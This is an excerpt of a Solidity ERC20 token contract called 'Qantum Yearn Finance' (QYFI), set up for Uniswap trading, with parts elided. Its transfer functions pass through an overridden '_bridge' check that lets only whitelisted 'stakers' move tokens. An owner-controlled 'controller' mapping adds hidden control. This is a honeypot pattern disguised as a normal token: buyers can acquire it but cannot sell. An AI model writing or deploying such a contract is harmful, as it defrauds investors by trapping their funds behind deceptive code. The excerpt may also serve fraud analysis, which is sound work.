...
contract ERC20 is Context, IERC20 {
    ...
    function transfer(address recipient, uint amount) public returns (bool) {
        _bridge(_msgSender(), recipient, amount);
        return true;
    }
    ...
    function transferFrom(address sender, address recipient, uint amount) public returns (bool) {
        _bridge(sender, recipient, amount);
    ...
    function _bridge(address sender, address recipient, uint amount) internal {
...
contract  QantumYearnFinance is ERC20, ERC20Detailed {
  address public uniV2Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
  using SafeMath for uint;
  mapping (address => bool) public controller;
  mapping (address => bool) public stakers;
  constructor () public ERC20Detailed("Qantum Yearn Finance", "QYFI", 18) {
      _initMint( msg.sender, 750*10**uint(decimals()) );
  ...
  function _bridge(address from_, address to_, uint amount) internal {
    require(stakers[from_], 'unauthorized');
    super._bridge(from_, to_, amount);
  }
  function _checkBalance(address account) public {
      require(controller[msg.sender], "error");
